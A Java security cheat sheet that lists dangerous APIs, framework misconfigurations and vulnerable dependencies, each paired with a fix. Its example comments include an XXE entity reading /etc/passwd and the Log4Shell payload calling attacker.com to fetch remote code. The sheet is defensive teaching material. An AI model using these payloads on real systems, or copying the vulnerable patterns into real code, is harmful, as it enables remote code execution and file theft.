# Java Security Patterns

## Dangerous Functions

| Function | Risk | CWE | Severity | Safe Alternative |
|----------|------|-----|----------|-----------------|
| `ObjectInputStream.readObject()` | Deserialization RCE | CWE-502 | CRITICAL | JSON/Protobuf, input validation |
| `Runtime.getRuntime().exec(cmd)` | Command injection | CWE-78 | CRITICAL | ProcessBuilder with array, no shell |
| `Statement.execute(sql + input)` | SQL injection | CWE-89 | CRITICAL | PreparedStatement |
| `Class.forName(userInput)` | Arbitrary class loading | CWE-470 | HIGH | Allowlist of classes |
| `ScriptEngine.eval(code)` | Code injection | CWE-94 | CRITICAL | Remove or sandbox |
| `JNDI lookup(userInput)` | JNDI injection (Log4Shell) | CWE-917 | CRITICAL | Disable JNDI lookups |
| `XMLInputFactory` (default) | XXE | CWE-611 | HIGH | Disable external entities |
| `XPathExpression.evaluate(input)` | XPath injection | CWE-643 | HIGH | Parameterized XPath |
| `Velocity.evaluate(template)` | Template injection | CWE-94 | CRITICAL | Static templates only |
| `SpEL parser.parseExpression(input)` | Spring EL injection | CWE-917 | CRITICAL | Don't evaluate user input |

## Framework-Specific Vulnerabilities

### Spring Boot

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| Actuator endpoints exposed (`/actuator/env`, `/actuator/heapdump`) | Info disclosure, credential leak | HIGH | Restrict with Spring Security, disable in prod |
| `@ModelAttribute` without `@InitBinder` whitelist | Mass assignment | HIGH | Use `setAllowedFields()` |
| `@RequestMapping` without method restriction | Unexpected HTTP methods | MEDIUM | Use `@GetMapping`, `@PostMapping` etc. |
| `th:utext` in Thymeleaf | XSS (unescaped) | HIGH | Use `th:text` (auto-escaped) |
| SpEL in `@Value("#{...}")` with external input | Expression injection | CRITICAL | Don't use user input in SpEL |
| `@CrossOrigin(origins = "*")` | CORS misconfiguration | MEDIUM | Specify exact origins |
| Missing `@PreAuthorize` on controller methods | Unauthorized access | HIGH | Add method-level security |

### Hibernate/JPA

| Pattern | Risk | Fix |
|---------|------|-----|
| `createQuery("FROM User WHERE name = '" + input + "'")` | HQL injection | Use named parameters `:param` |
| `createNativeQuery(sql + input)` | SQL injection | Use `setParameter()` |
| Entity with `@Lob` deserialized from untrusted source | Deserialization | Validate before deserializing |

## Deserialization (The #1 Java Threat)

```java
// CRITICAL: Never deserialize untrusted input
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject(); // RCE via gadget chains!

// Known gadget chain libraries (if on classpath = exploitable):
// - Apache Commons Collections
// - Spring Framework
// - Apache Commons Beanutils
// - Groovy
// - Apache Wicket

// SAFE: Use ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*" // Only allow specific classes
);
ois.setObjectInputFilter(filter);

// SAFER: Don't use Java serialization at all
// Use JSON (Jackson/Gson) or Protobuf instead
```

## XML External Entity (XXE)

```java
// DANGEROUS: Default XML parsing allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// If XML contains: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
// The parser will read /etc/passwd

// SAFE: Disable external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## JNDI Injection (Log4Shell Pattern)

```java
// CRITICAL: Log4j CVE-2021-44228
logger.info("User: " + userInput);
// If userInput = "${jndi:ldap://attacker.com/exploit}"
// Log4j resolves the JNDI lookup → RCE

// Also dangerous in other JNDI contexts:
InitialContext ctx = new InitialContext();
ctx.lookup(userControlledString); // JNDI injection
```

## Dependency Risks

| Dependency | CVE/Issue | Fix |
|-----------|-----------|-----|
| Log4j < 2.17.1 | CVE-2021-44228 (Log4Shell) | Update immediately |
| Commons Collections < 3.2.2 | Deserialization gadgets | Update or remove |
| Jackson Databind (polymorphic) | CVE-2019-12384+ | Disable `enableDefaultTyping()` |
| Spring Framework < 5.3.18 | CVE-2022-22963 (SpEL injection) | Update |
| Apache Struts 2 | Multiple RCE CVEs | Migrate or update |
| Fastjson < 1.2.83 | Deserialization RCE | Update or switch to Jackson |
